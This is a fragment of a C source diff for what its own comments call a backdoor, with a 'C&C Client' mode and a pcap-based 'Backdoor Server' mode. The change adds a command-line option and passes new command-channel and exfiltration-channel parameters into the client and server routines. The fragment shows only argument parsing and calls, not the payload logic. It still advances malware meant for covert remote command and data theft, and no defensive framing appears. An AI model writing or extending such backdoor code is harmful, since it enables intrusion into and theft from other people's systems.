@@ -50,7 +50,7 @@ int main(int argc, char *argv[])
 	strncpy(filter, DEF_FLT, MAX_LEN);
 	strncpy(folder, DEF_WCH, MAX_LEN);
 
-	while ((c = getopt(argc, argv, ":cshi:p:f:w:m:x:")) != -1)
+	while ((c = getopt(argc, argv, ":csdhi:p:f:w:m:x:")) != -1)
 	{
 		switch(c) 
 		{
@@ -108,9 +108,9 @@ int main(int argc, char *argv[])
 	ipaddr = resolve(rmthost);
 
 	if (client) // C&C Client
-		backdoor_client(ipaddr, port); // Start command entry
+		backdoor_client(ipaddr, port, command_chan, exfil_chan); // Start command entry
 	else // Backdoor Server
-		pcap_start(filter, ipaddr, folder);
+		pcap_start(filter, ipaddr, folder, command_chan, exfil_chan);
 	
 	return 0;
 }
